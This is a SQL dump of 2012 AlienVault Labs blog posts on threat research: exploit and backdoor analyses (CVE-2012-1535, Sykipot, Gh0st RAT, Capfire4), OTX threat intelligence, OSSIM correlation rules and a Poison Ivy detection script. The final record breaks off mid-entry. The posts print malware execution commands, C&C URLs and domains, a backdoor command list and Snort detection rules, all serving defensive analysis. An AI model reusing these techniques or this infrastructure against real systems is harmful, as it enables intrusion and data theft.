INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (87, 'CVE-2012-1535: Adobe Flash being exploited in the wild', 'Jaime Blasco', 'August 15, 2012 ', 'Yesterday Adobe issued a security update to address CVE-2012-1535 that was being exploited in the wild.The sample that we analyzed is a Microsoft Office Word document with an embedded malicious Flash file.The name of the malicious doc file is iPhone 5 Battery.doc, md5: 7e3770351aed43fd6c5cab8e06dc0300The doc file contains an uncompressed flash file at offset 13832. The file contains the code to do the heap spraying.The shellcode uses a XOR loader to decrypt and execute the embedded payload encrypted using a 256-byte XOR key within the DOC file.We can easily extract the payload using our findexec.py script.$python findexec.py  “iPhone 5 Battery.doc” OFFICEAnalyzing Office fileOne Byte distributionAverage 1166Detected possible cyphered data on position 67584 of length 135168Best Val num ocurrences 256Guessed key length 256Calculating calculateOccurencesBySizeDoneGetVolumeInformationA?GetWindowsDirectoryA?GetSystemDirectoryA.CloseHandleiGetLastErrorHLoadLibraryA?Process32Next?Process32FirstlCreateToolhelp32Snapshot?ExitProcess?GetVersiKey found c4c5c6c7d8d9dadbdcdddedfd0d1d2d3d4d5d6d728292a2b2c2d2e2f202122232425262738393a3b3c3d3e3f303132333435363708090a0b0c0d0e0f000102030405060718191a1b1c1d1e1f101112131415161768696a6b6c6d6e6f606162636465666778797a7b7c7d7e7f707172737475767748494a4b4c4d4e4f404142434445464758595a5b5c5d5e5f5051525354555657a8a9aaabacadaeafa0a1a2a3a4a5a6a7b8b9babbbcbdbebfb0b1b2b3b4b5b6b788898a8b8c8d8e8f808182838485868798999a9b9c9d9e9f9091929394959697e8e9eaebecedeeefe0e1e2e3e4e5e6e7f8f9fafbfcfdfefff0f1f2f3f4f5f6f7c8c9cacbcccdcecfc0c1c2c3FoundFound executable at offset 3264File saved on 1345068027.exeFound executable at offset 27936File saved on 1345068028.exeOnce the document is open and the vulnerability is exploited, the shellcode opens a benign doc file with the following content:Once the payload is executed, the following dll is dropped on the system:C:\\Documents and Settings\\Administrator\\Application Data\\taskman.dllmd5: fe7e03f7f62f2d65c5b8e233300a373cAnd executed using rundll32:rundll32.exe C:\\Documents and Settings\\Administrator\\Application Data\\taskman.dll startThis backdoor is know as c0d0so0 and also Backdoor.Briba and it has been seen in other targeted attacks exploiting  CVE-2012-0779 among others during the past few months.The backdoor contacts the remote sever publicnews.mooo.com using a HTTP POST request:It also tries to download the following file:publicnews.mooo.com points to:unassigned.psychz.net (108.171.240.86)108.171.240.0 - 108.171.255.255Psychz Networks PSYCHZ-NETWORKS (NET-108-171-240-0-1) 108.171.240.0 - 108.171.255.255The server is not responding anymore but based on the VirusTotal report it seems the logo.gif is a zip file that contains an executable that is dropped on the system:C:\\Documents and Settings\\<USER>\\Application Data\\TASKMAN_16vtn.exeThe executable drops another DLL that is called using rundll32:C:\\WINDOWS\\system32\\cmd.exe C:\\WINDOWS\\system32\\cmd.exe” /c rundll32.exe “C:\\Documents and Settings\\All Users\\Application Data\\XpsFilter.dll” (successful)That process performs HTTP POST requests to the following url:hxxp://publicupdate[.]mooo[.]com / index000000001.aspThat resolves to:n122z183l230.bb122100.ctm.net (122.100.183.230)122.100.128.0 - 122.100.255.255CTMAnita CheCTMP.O.Box 868+853 891-3880+853 891-3111[email protected]Rua de Lagos, TelecentroP.O. Box 868TaipaMacauThe use of Dynamic DNS providers like DynDNS.org , 3322.net.. is very common in this kind of threats. You should be monitoring the requests to dynamic dns providers in your network, you can use the following snort rule to detect hosts contacting mooo.com subdomains:alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:“ET INFO DYNAMIC_DNS Query to mooo.com Domain *.mooo.com”; content:”|01 00 00 01 00 00 00 00 00 00|”; depth:10; offset:2; content:”|04|mooo|03|com|00|”; fast_pattern; distance:0; threshold: type limit, count 1, track by_src, seconds 300; classtype:misc-activity; sid:1111111113; rev:6;)alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:“INFO DYNAMIC_DNS HTTP Request to a *.mooo.com Domain”; flow:established,to_server; content:”.mooo.com|0D 0A|”; http_header; classtype:bad-unknown; sid:1111111112; rev:3;)The following rule is also useful to detect the presence of Backdoor.Briba:alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:“TROJAN Backdoor.Briba Checkin”; flow:to_server,established; content:“POST”; nocase; http_method; content:“loginmid=”; http_client_body; content:“nickid=”; http_client_body; classtype:trojan-activity; sid:1111111114; rev:1;)And of course, remember to patch your systems!Update:We have found another sample of  Backdoor.Briba related with the same campaign. This sample connects to the C&C publicdocs.mooo.com. In this case the server is running. The sample downloads the file hxxp://publicdocs[.]mooo[.]com / docs / help.gifThe file contains a GIF header followed by a password protected zip file. It is easy to extract the password from the original sample (password123).It drops and executes XpsFilter.dll that we previously mentioned. This file has a low Antivirus detection rate:https://www.virustotal.com/file/4a03c174c247a86501889baca416811fd794fa4cef501121ba0be8bc78964d4d/analysis/', 'flash playercve-2012-1535', '/blogs/labs-research/cve-2012-1535-adobe-flash-being-exploited-in-the-wild');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (88, 'Feeding Alienvaultâs Open Threat Exchange (OTX) threat information to ArcSight', 'Jaime Blasco', 'August 6, 2012 ', 'When we launched the Open Threat Exchange (OTX) project, one of our goals was creating an open and free threat database and exchange system. We want it to be used by as many users as possible using a wide range of technologies.That is why we are publishing some code to feed our Open Threat Exchange (OTX) data to an ArcSight SIEM using the Common Event Format via Syslog.The Open Threat Exchange (OTX) contains an IP reputation database that offers real time information of bad actors. Using this information within a SIEM gives you new possibilities to correlate data, for example:Connection to know C&C serversDetection of P2P botnetsData exfiltration to low reputation serversPassword guessing attacks from bad actorsExploit/Malware access from malicious servers...Download the required files: - otx-arcsight.py http://alienvault-labs-garage.googlecode.com/files/otx-arcsight.py [no longer available]- config_otx.cfg http://alienvault-labs-garage.googlecode.com/files/config_otx.cfg [no longer available]The configuration is very easy, just open the configuration file config_otx.py:[main]syslog_level = noticesyslog_facility = daemonsyslog_host = 10.49.5.139reputation_server = https://reputation.alienvault.com/syslog_port = 514revision = 0[fields]min_reliability = 2min_priority = 2ignore_activities =[proxy]enable = Falsehost =user =password =port =Configure your collector ip address on syslog_host and you are ready to go. The script will download the reputation data from ours servers (HTTP) and it will send that data to the collector using UDP.Then you need to create an Active List in ArcSight to use the indicators.If you need to access the Internet via a proxy, configure it under the proxy section.Using this method, our reputation data is updated in an hourly basis so you can configure a cron job to execute the script once an hour.You can also configure some filters, if you want to ignore some ff the activities we send you can use this syntax:ignore_activities = Scanning Host,SpammingThe min_reliability is the minimum reliability value that will be send to the collector based on the reliability that OTX put to that ip address. The same with min_priority, it is the minimum priority value that will make the information to be sent.$ python otx-arcsight.pyServer data rev is 14694Local rev is 14694It means the database is up to date.$ python otx-arcsight.pyServer data rev is 14694Local rev is 14691Updating data from serverDownloading complete databaseSending CEF:0|AlienvaultOTX|AlienvaultOTX|1.0|100|Suspicious Host|1|src=94.248.192.110 msg=Scanning Host,http://reputation.alienvault.com/panel/ip_json.php?ip=94.248.192.110Sending CEF:0|AlienvaultOTX|AlienvaultOTX|1.0|100|Suspicious Host|1|src=94.248.192.112 msg=Scanning Host,http://reputation.alienvault.com/panel/ip_json.php?ip=94.248.192.112', 'threat intelligencethreat datacommon event formatarcisght', '/blogs/labs-research/feeding-alienvaults-open-threat-exchange-otx-threat-information-to-arcsight');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (89, 'Poisoning the Well, or Securing the Future', 'Russ Spitler', 'August 6, 2012 ', 'Here we go again.You know the expression, âNo good deed goes unpunishedâ?Â  Well that idea has surfaced with regard to our OTX, or Open Threat Exchange.Â  Let me explain what I mean.First, some background.Â  Â We launched OTX back in February with a passionate belief in the power of transparency and open source models.Â Â  But weâre also as realistic as the next guy, which means we knew that it might open a crack in the door for those with malicious intent.So when weâre asked whether the benefit of sharing threat intelligence is worth the perceived risk, weâve got an answer.Â  Itâs not a flippant answer or a dismissive one.Â  We thought through the implications of openness, and baked that into the design of Open Threat Exchange.Â  And it is a continuous factor in our ongoing product decisions.To fully respond to the question about creating risk, we need to look at potential attack vectors, within OTX.Â  And then consider the consequences if an attacker is able to exploit one of them.An attacker is able to introduce data into Open Threat ExchangeAn attacker is able to access the information that OTX distributesAn attacker is able to access the information that a particular contributor shares with OTXAn attacker is able to impersonate OTX and feed a particular contributor bad dataFour possibilities, each one of them carefully considered.Â  I hope I wonât bore you with the detail below, but itâs all important.Attack Vector #1: An attacker is able to introduce data into Open Threat ExchangeOpen Threat Exchange allows users to share reputation information for IP addresses, collaboratively creating a list of addresses known to manifest malicious behavior. Â The IP may not be completely malicious, but its previous actions should be considered when evaluating any future suspicious behavior that might originate from it.IP addresses that are not on the list are not considered to be good, they just simply are not known to be bad.Â  That is aÂ  âblacklistâ philosophy, and itâs the most prudent approach in this case.Â  Think about it. Malicious introduction of benign IP addresses could cause OSSIM / AlienVault to inappropriately classify them as suspicious but there is no way to âwhitelistâ IP addresses (classify them as benign).Since OTX is open to anyone, mitigating controls have been put in place.Â  Submissions by any source are validated by the content of other contributors, by information collected by systems run by AlienVault, AND by contributors that are known as trustworthy.Â  We also collect other information related to the IP address to substantiate the observed malicious behavior.Â  For example, indicators like a recently registered domain name, or an IP with dynamic DNS are carefully examined.Â  We expect our validation to largely address the potential issues coming from this attack vector.However, even in the worst-case, if benign addresses slip through these validation mechanisms, the impact is minimal as the consequence means that false alerts would be generated by the AlienVault/OSSIM installation.Attack Vector #2: OTX IS TOO Open, and an attacker is able to access the information we distributeAssume that this is happening. Â However, its implications are not too concerning; the attacker already knows that an IP address they control is performing malicious activity so the only information that they are gaining is potentially that one of their IP addresses is now known to be malicious.Â  If anything, that should render them more cautious about that address.One variation of this risk is that an attacker might probe an environment for the use of AlienVault/OSSIM.Â  It is true that if an attacker were to target a single victim from a unique IP and that IP then appears in Open Threat Exchange, the attacker could confirm that the target participates in Open Threat Exchange through this penetrative validation.However, confirming participation in the Open Threat Exchange does not actually reveal anything substantial about the defensive capabilities that are in place.Â  The attacker gains no information related to how the AlienVault / OSSIM installation is configured, how broadly it is deployed, what correlation rules are being used, nor do they gain any information about the other security controls that are deployed. Indeed, it sends a message that a potential target is paying smart attention to security; it might send the attacker elsewhere.Attack Vector #3: An attacker is able to access the information that a particular contributor shares with Open Threat ExchangeYes, to be candid, being able to isolate a particular contributor is a little more worrisome than the other attack vectors.Â  But even so, the information that is shared would not likely lead to a compromise.Â  If a contributor is sharing the list of external IP addresses that have triggered alerts, then thatâs the only information that they are revealing.If an attacker was able to access this information, they could confirm that their particular attack was detected and move on to a different strategy.Â  So yes, here we see the potential for an attacker to improve their efficiency since we are effectively providing them a signal from which they can determine their attack is failing.However—and this is a huge however—we are not introducing a new vulnerability or providing breadcrumbs to further their attack.Â  Open Threat Exchange does not store or distribute any identifying information about who contributes the information in OTX.Â  This means that the only potential way for this to be exploited is through the transport of the information.Â  But by using the industry standard SSL protocols and valid certificates, our transport channel is no more vulnerable than any other SSL encrypted-channel. Not perfect but pretty darn good.Attack Vector #4: An attacker impersonates the Open Threat Exchange and spoofs a contributor with bad dataThe issues are similar to the first attack vector.Â  But instead of controlling just a few of the IP addresses on the blacklist, here the attacker is controlling all of them, potentially resulting in a large number of false alerts. This could possibly diminish the utility of the SIEM.Â  But simply disabling the reputation-based correlation rules would quickly address a DOS attack on the SIEM.Whatâs more, actually exploiting this attack vector would require a successful man-in-the-middle attack on the SSL connection between the OSSIM / AlienVault installation and AlienVault.Â  A possibility, but if someone were to pay the price of doing this to you, there are more interesting encrypted connections coming from your network I am sure J.To summarize, weâve kept an open mind as we developed our Open Threat Exchange.Â  We are not oblivious to the risks.These attack vectors have all been assessed in the context of the information we are sharing today: IP Reputation.We also recognize that OTX isnât static.Â  It shouldn’t be.Â  So as the platform expands and new information is shared we will consider these vectors and introduce new mitigating controls if necessary.Good things and the right behaviors have risks associated with them. That includes sharing threat intelligence; but even if the system were to be completely compromised, the advantage an attacker might gain is minimal.Â  Weâre proud that the dangerous status quo of self-imposed isolation is broken.Â  We look forward to your contributions to both OTXs â the Open Threat Exchange, and the Open Thread exchange, below.Read more about Open Threat Exchange here, and check out the infographic featuring threat data from the first five months of the Open Threat Exchange.', 'otx', '/blogs/labs-research/poisoning-the-well-or-securing-the-future');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (90, 'The Power of All', 'Dominique Karg', 'August 2, 2012 ', 'A little bit over five months ago, AlienVault released the first public version of its Open Threat eXchange, OTX. We’ve just created an info graphic – titled “The 2nd United Nations: The World Comes Together to Open-Source Cyber Security” – in order to share some interesting findings from the first five months of use.The goal of OTX is to have a collaborative shared-intelligence platform taking input from OSSIM and its connected devices, both free open source and commercial, and providing the output free of charge in different formats for reuse.   The ‘power of all’ to collect and share threat data.In its current form, with the IP reputation database at its core, OTX can be compared to the IAFIS fingerprint database.  A certain IP address would have its own “rap sheet” inside the OTX database with the “crimes” committed by that IP associated to it. In no way is a relationship between the crimes and the crime reporter saved, so think of it as giving anonymous tips when you share data with OTX.At the time of this writing, the most wanted IP is 66.150.14.46, with 9865 detected “crimes” (as defined above: sharing malware, attacking one of the OSSIM installations, attacking our honeypots, etc.).If you go to this IP’s page (or any other in the “most wanted” if that one’s clean), you will see a full list of this IP’s crimes, what we call “Malicious Activity”, such as having a malware domain pointed at it, being a known malware IP, being an IP included by other sources as part of a known network of malicious IP addresses, spamming, etc.This database of malicious activity can serve many purposes:Validate access to systems through correlationRaise awareness of lower priority events with this IP in them either as source or destinationVisually notifying the user through the interface of this IP being “malicious” throughout the interfaceUsing the database’s contents to write firewall or correlation rulesEtc.As you can see, applications can be many, and these are just the tip of the iceberg.We have mentioned this before but we’ll say it again: the more people whose systems contribute data to OTX, the more information will be gathered and shared among OTX members.And as with police/government databases, we don’t have to stop at IP addresses and attacks. Information such as traffic trends, statistics on type of target and on amount of traffic can all lead to enhanced detection capabilities.There’s a big difference between the police/government databases and OTX though: you, the user, chose what to share and how, and when you want to get full insight into the results of this “collection”.On the info graphic mentioned above we show a series of statistical results and curious data trends found in OTX during its first five months. It makes no sense repeating them in this text, but we’d like to highlight some points.The obvious one would be to apply a golden rule that firewall admins around the world have used for decades: default deny.If you look at the top malicious networks it would make sense for most organizations and end users (or even full ISPs) to completely drop inbound traffic from and outbound traffic to the entire IP address space of China. Of course, this is not practical and actually a somewhat dangerous precedent, since it could lead to other types of IP censorship under the excuse of “mistakes”.What would be interesting is a statement from the Chinese government as to why their firewalls so successfully filter inbound content to their citizens, but are so bad at filtering outbound malicious activity. (Maybe free-speech-over-malware should become a common practice in some countries where free speech is harder to get in a different way…)If we have a look at the top activities, we could quickly derive a pie chart like this one:  More than ½ of the top 4 activities are scanning: either port scanning, scanning for live hosts, scanning for vulnerable services, i.e. recognition. There is almost no legitimate reason for a host to be doing any of these on an external IP. It would be similar in a real life scenario to someone walking down a street at night and checking car doors or house entrances to see if they’re open.This is pretty rudimentary stuff, but still comprises the vast majority of attacks seen out there. The more sophisticated “scanners” wouldn’t be caught by default detection configurations anyway. (Imagine a group that wants to gain entry into a building, and every week a different person walks in front of it through a crowded street taking a 3 second sneak peak at it… hard to mark as suspicious.)The others malicious activities are even more obvious. An IP hosting malware is either:a)    Consciously distributing itb)   Has been intruded and is being used as a zombie serverc)    Hosts it for research purposes, in which case it should prevent it from being immediately accessible to any automated hostA real life simile to a) and b) would be meth dealing. Whether you deal directly out of your home or you’re renting your home to a meth dealer, in both cases the home should be raided and everything confiscated, destroyed, and all participants put in jail. Legislation lagging 30 years behind reality, international boundaries and similar impediments make its virtual enforcement more difficult than it sounds.Finally, spamming should be a capital crime anyway.On the malicious content by type, we see some more interesting trends. Even with all the hosted content (no, I won’t say the C**** word), web front-ends, mobile media and so on, executable files are still number one in malicious content. This is probably due to wide-open holes in known operating systems and software still being discovered on a continuous basis.Securing HTML shouldn’t be so difficult if you ask me, but I guess there’s more behind developing a safe/secure HTML rendering engine than is apparent.I won’t talk about compressed files since it is my belief that any problems related to compressed and .exe files can be blamed entirely on antivirus software alone.Finally, if Adobe would drop flash in favor of HTML5 and we used a simpler .xml (or similar language) based self-contained document format, we’d have fewer headaches.So much for talk about the malicious content, the rest of the data is more or less self-explanatory.All of us at AlienVault—and me personally as information security enthusiast—would like to thank each and every one of you who contribute to the OTX effort.Download OSSIM and check out the global contributions that are making OTX so valuable.', 'otxinfographic', '/blogs/labs-research/the-power-of-all');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (91, 'New AlienVault OSSIM v4.0 is out: New correlation capabilities', 'Jaime Blasco', 'July 18, 2012 ', 'Today we are launching the new AlienVault OSSIM v4.0.You can download it from here.Apart from tons of new features, we have improved the correlation engine capabilities, two of the most impressive features are:- Taxonomy correlation based on the Category and Subcategory of the events.- Correlation using the Open Threat Exchange (OTX) data.The correlation directives editor has been improved so you won’t need an XML editor anymore (in theory :D).I will share with you a couple of  basic examples that will teach you how to use the new interface to build correlation rules using this new features.Example 1: Outbound FTP connection to an external server marked as suspiciousOn this example we will see how to detect outbound FTP connections to an external server that is present on the Open Threat Exchange system that indicates that can be a malicious or hacked server where data is being exfiltrated.To create a new correlation rule click on Intelligence->Correlation Directives and then on the button “Add Directive”Set the priority to 5:And create the rule for the first level (the correlation directive will have only one level)Then select the Taxonomy radio button and set the product type to FirewallOn the next window, select the Taxonomy radio button once again and set the category to Network and the subcategory to FTP_activityThe next window is used to set the source and destination conditions. For the Source we will click on HOME_NET, that means the correlation rule with match on events that have a source address belonging to the local networks we have defined in the system. For the destination click on !HOME_NET that will match on destination address that are outside our network. Click also on Reputation options and set “Reputation to” to yes. It will match on destination addresses that are marked as suspicious on the Open Threat Exchange data.For the next windows you can let the default values set.Once you create the correlation directive you have to perform a last step, it is because a small bug on the web interface. Go to Intelligence->Correlation Directives and on the User category click on “Edit XML directive file”:As you can see in the following screenshot, add the content type=“detector” to the rule level of the XML file:Finally click on Restart Server and your correlation rule will be loaded on the system.Following you can see an example of the correlation rule firing:If you click on the details, you will see that the alarm has been fired using an event from a Cisco Pix Firewall This correlation rule is very useful to detect information being leaked to external servers by malware or intruders.Example 2: SQL injection followed by error 500 on the web serverIn this example we will see how to detect potential SQL injections in our web servers. The rule will detect an SQL injection attack detected by an Intrusion Detection System (IDS) followed by an error 500 on the destination web server that indicates that an error was detected on the web application.Let’s create a new directive:     Let the default values for the next windows.Then edit your recently created directive and add a new rule level:   On the next screen you have to set the option Source, From a parent rule: Source IP from level 1 and Destination, From a Parent Rule: Destination IP from level 1 that means the source and destination should match with the values seen in the first level we created.Set the number of ocurrences to 1:The timeout to 10 seconds:And the reliability to 8:Now you are done, remember to edit the XML file as we did in the previous example and add the type=“detector” to both rule levels:Enjoy it!. Remember if you have any comments or doubts feel free to ask in our brand new Alienvault OSSIM Forum', '', '/blogs/labs-research/new-alienvault-ossim-v40-is-out-new-correlation-capabilities');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (92, 'Nmap Script to detect Poison Ivy Clients', 'Jaime Blasco', 'July 6, 2012 ', 'I want to share with you a Nmap script that will help you detecting Poison Ivy clients (due to the Poison Ivy nomenclature, the term client refers to the malicious server where the victims connect in order to receive commands).The Poison Ivy’s protocol uses a challenge-response handshake in order to perform the authentication. The server (victim) sends an unencrypted 256 bytes random challenge to the client (malicious server). Once the server receives the challenge, it encrypts the data and sends the response back to the server. The encryption uses the Camellia block cipher that has a 16 bytes block size.I have written a small Nmap script http://alienvault-labs-garage.googlecode.com/files/poison_ivy.nse [no longer available] that sends the challenge handshake to the client and expects a 256 byte response. It is able to detect if the Poison Ivy’s password used is the default one (“admin”).Sample output: jaime$ ./nmap -P0 -v --script=poison -p3460 192.168.1.38 \n\n\n\nStarting Nmap 6.01 ( http://nmap.org ) at 2012-07-06 12:12 CEST\n\nNSE: Loaded 1 scripts for scanning.\n\nNSE: Script Pre-scanning.\n\nInitiating Parallel DNS resolution of 1 host. at 12:12\n\nCompleted Parallel DNS resolution of 1 host. at 12:12, 0.10s elapsed\n\nInitiating Connect Scan at 12:12\n\nScanning 192.168.1.38 [1 port]\n\nDiscovered open port 3460/tcp on 192.168.1.38\n\nCompleted Connect Scan at 12:12, 0.00s elapsed (1 total ports)\n\nNSE: Script scanning 192.168.1.38.\n\nInitiating NSE at 12:12\n\nCompleted NSE at 12:12, 0.01s elapsed\n\nNmap scan report for 192.168.1.38\n\nHost is up (0.00067s latency).\n\nPORT     STATE SERVICE\n\n3460/tcp open  unknown\n\n|_poison: Poison Ivy client detected with default password, admin\n\n I hope you enjoy it!Update: Thanks to @badishi for pointing that we can check the next 4 bytes after the response (d0 15 00 00) that do not depend on the key.', 'ratnmapluapoison ivynse', '/blogs/labs-research/nmap-script-to-detect-poison-ivy-clients');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (93, 'Sykipot is back', 'Jaime Blasco', 'July 2, 2012 ', 'It has been a while since we published information about Sykipot. The last time we blogged about it, we discovered a variant that was able to bypass two-factor authentication to access protected resources on the victim’s network.\nWe have detected a new wave of Sykipot campaigns that has been running during the past weeks. There are several changes between the new Sykipot campaigns and the older ones.\nThe first difference is that in previous campaigns the Sykipot authors mainly used file-format exploits to gain access to the systems through spearphishing mails. This is the list of file-format exploits used in the past:\nCVE\nDate\nProduct\nCVE-2007-0671\n2007-02-02\nMicrosoft Excel\nCVE-2009-3957\n2010-12-01\nAdobe Reader\nCVE-2010-0806\n2010-05-04\nInternet Explorer\nCVE-2010-2883\n2010-09-08\nAdobe Reader\nCVE-2010-3654\n2010-10-28\nAdobe Flash Player\nCVE-2011-2462\n2011-12-06\nAdobe Reader\nThis time it seems they are mainly using drive-by-download exploits like CVE-2011-0611 affecting Flash Player or the new Windows XML Core zero-day vulnerability.\nThe CVE-2012-1889 vulnerability is related to Google’s warnings on state-sponsored attacks.\nInstead of attaching malicious files on e-mails, they send e-mails to the victims with a malicious link. Once the victim clicks on the link the malicious server tries to exploit a vulnerability on the user’s browser.\nThe modus operandi of the group behind these attacks seems to be the same as in the past. The attackers hack US based servers and then install software to serve the malicious content or to redirect the connections to a remote server.\nThe malware continues using SSL to communicate with the C&C server. Once executed, the malware tries to get a configuration file from a remote server. On the older versions they used an underlying encryption using the XOR key “19990817” for the config files. The XOR obfuscation has been removed and in the new versions a simple byte subtraction routine is used.\n\nThe configuration file is requested from a remote server using the following URL format:\nGET /get.asp?nm=index.dat&hnm=[HOSTNAME]-[IP-ADDRESS]-[IDENTIFIER]     (SSL based)\nThey continue to use the hardcoded referer of ‘www.yahoo.com’  on the requests.\nThe new configuration format supports several commands and most of the previous names have changed. This is the list of supported instructions:\n- porth - List of active connections (netstat-like)\n- processh - List of processes running on the system\n- tasklisth - List of processess (tasklist.exe-like)\n- serviceslisth - List of running services and their status (running/stopped)\n- starth - Starts a service\n- stoph - Stops a service\n- delh - Deletes a file\n- gh - Gets a file from the C&C server\n- ph - Uploads a file to the C&C server\n- dir/h - Lists a directory/file\n- dir/sh - Lists a directory/file\n- runh -\n- EXITH - Deletes the malware from the system\n- info - Executes a command (Winexec)\n- without param - Gets network info and startup time\n- sleeph - Sleeps a number of seconds\nOnce the malware downloads the config file it executes every instructions, it saves the result and obfuscates the data using the subtraction routine. Finally it sends the result to the C&C server.\nSome of the known Sykipot domains that are being used to serve malicious content or as C&C domains are:\n- newcarstyle.com\n- nhrasurvey.org\n- quicksurveypro.com\n- contractspt.com\n- betterslife.com\n- aeroconf13.org\n- e-landusa.net\n- photosmagnum.com\n- reythy.com\nMost of the domains have been registered during the last month and they have used the mail address jimgreen200088 [at] yahoo.com to register most of them.\nThe Netbox webserver used in previous campaigns is also present in most of the C&C servers .\nNote the domain aeroconf13.org seems to be related with a spearphishing campaign against potential attendees of the IEEE Aerospace Conference (the International Conference for Aerospace Experts, Academics, Military Personnel, and Industry Leaders).\nWe will continue to offer more information on these new campaigns as long as we find more details. Stay tune for more information and apply your patches!', 'sykipotcve-2012-1889ieee aerospace conference', '/blogs/labs-research/sykipot-is-back');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (94, 'New MaControl variant targeting Uyghur users, the Windows version using Gh0st RAT', 'Jaime Blasco', 'June 29, 2012 ', 'A couple of hours ago, Kaspersky reported a new variant of the MaControl backdoor targeting Uyghur users.It seems to be a newer version of the MacControl RAT we found some months ago being dropped using Java and Office for Mac exploits.The attackers send mails to the victims with a zip file that contains the backdoor and an image. We have spotted similar mails that contains a a RAT that connects to the same IP address as the Kaspersky variant but it affects Windows users. The mail has the following content:And the image on the zip file:Attached within the zip there is a Winrar file:The Winrar file extracts the following binary:The binary copies itself on \\Documents and Settings\\USER\\Local Settings\\Temp\\kbdmgr.exeAnd then the Winrar file is deleted from the system:C:\\WINDOWS\\system32\\cmd.exe /c del C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\RarSFX0\\1.exeThe file kkbdmgr.exe also drops the following dll:\\Documents and Settings\\USER\\Local Settings\\Temp\\kbdmgr.dllA mutex is created on the system to identify the infection:\\BaseNamedObjects\\WuSh B- Is Running!Finally the dll is loaded and injected into explorer.exeOnce injected, the backdoor establish the communication with the C&C server:The code executed belongs to a version of the infamous Gh0st RAT', '', '/blogs/labs-research/new-macontrol-variant-targeting-uyghur-users-the-windows-version-using-gh0s');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (95, 'Thailand NGO site hacked and serving malware', 'Jaime Blasco', 'June 28, 2012 ', 'During the previous days, Sophos has reported several attacks related to theÂ Windows XML Core zero-day vulnerability:-Â http://nakedsecurity.sophos.com/2012/06/26/hotel-jobs-malware/-Â http://nakedsecurity.sophos.com/2012/06/20/aeronautical-state-sponsored-exploit/-Â http://nakedsecurity.sophos.com/2012/06/19/unpatched-microsoft-security-vulnerability-exploited/TheÂ CVE-2012-1889 vulnerability is related to Google’s warnings on state-sponsored attacksÂ .We have recently found another website exploiting this vulnerability that is related to the attacks reported by Sophos. It shares exploit code as well as server infrastructure, meaning that it seems to be the same group is behind all these attacks.In this case, a Thailand NGO portal related toÂ ASEAN human rights has been hacked and malicious code has been planted on the site, infecting the users that visit the portal.Every time a page is displayed to the visitor the content is modified and some html is appended to it:As can be seen, the file news.html is opened with every request and contains the actual exploit code:The malicious code checks the operating system version, as well as the Java JREs present on the system using the javascript file deployJava.js. Therefore if the system is running Windows XP or the system is running Windows 7 with Java JRE 1.6 the flash file Geoffrey.swf is loaded.The flash file is in charge of heap spraying and setting up the shellcode that drops the malicious payload on the system.Another interesting file included is icon.js that is loaded from an external server. It seems this file is included to doÂ reconnaissance obtaining information about the visitor’s system. Once loaded, the javascript code sends the following information to an external server:- Address- Cookies- List of software- Browser version- Flash versionThe tricky part on this file is that it uses a list of software to check the presence of known files on the system, mainly Antivirus. This method seems to work only with Internet Explorer <= 8.The function that performs the check is the following.This technique tries to load an image embedded on the resource section of a Dll/Exe. If the image can be loaded it means the DLL is present and the software is installed on the system.An example using explorer.exe:{id: \'Windows Explorer\', res: \'res://explorer.exe/#2/#143\'}Exploring the resource section of the executable we can find the resource named 143 within the Bitmap directoryThe function uses the following array of files, cut out:The complete list of applications is:- Webroot- Sophos- Microsoft Security Client- F-Secure- BitDefender- Norton Antivirus- McAfee Antivirus- Kingsoft Antivirus- Avira Antivirus- KasperskyÂ Antivirus- 360 AV- ESET NOD32- Trend Micro Internet Security- Rising Antivirus- Vmware Player- Vmware Tools- Windows ExplorerDue to an error on the malicious server, we were able to get the logs generated by the icon.js requests. Here are some statistics generated based on the data collected by the attackers since June 21st:- Top countries:- Top Browsers:- Operating systems:- Antivirus:ConclusionsAs we have previously discussed, the number of state-sponsored incidents involvingÂ Southeast Asian Nations have been increasing steeply during the last months, specially those related toÂ non-governmental organizationsÂ (NGOs).We have described a technique used by attackers to performÂ reconnaissance that gives them information about potential targets, including software and Antivirus versions. This information can be used to perform future attacks on the victims.Being able to detect the Antivirus used by the victim within the browser opens new options when exploiting systems. Using that technique the attacker can drop different payloads based on the installed Antivirus to evade detection.', '', '/blogs/labs-research/thailand-ngo-site-hacked-and-serving-malware');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (96, 'Capfire4 malware, RAT software and C&C service together', 'Alberto Ortega', 'June 21, 2012 ', 'A big amount of the malware out there are RAT (Remote administration tool) samples. This is software created by people specialized on it, people that develop, improve and sell their tools. It  has capabilities that let the attacker spy on the victims with actions like screen capturing, keylogging, password stealing, command execution and remote access and controlling.Their clients usually pay to gain access to the tools and additional services like support, zero or low antivirus detection, ...We are going to see a service we have been studying recently. Clients pay for the service and then they gain access to a web portal where they can generate personalized Trojans, manage the infected victims via the web browser and host the malware on their “cloud”.Creators promote itself as a service to remote control computers and “recover passwords”.It means that clients don’t have to mess with almost any technical issues, and they don’t need special skills or knowledge. The providers supply the tools, the hosting, and the Command and Control server.When you login in your personal account you can see the main menu, tutorials and shortcuts.  The control panel uses HTTPS with a valid certificate.  Then you can create a new personalized malware (Trojan Horse) that will be generated in real time.  They take care of the antivirus detections for you. Created samples have a very low antivirus detection ratio (2/42).  Then the time to host the malware comes. Clients can choose between some fake domains that seem legitimate. The administrator of the service have bought two domains to create the fake subdomains.  cf.pro.bras.bio.brThe domain whois data from the main website is hidden but the previous domains we mentioned are not. This way we can discover some information about the authors:http://whois.domaintools.com/cf.pro.brdomain: cf.pro.browner: 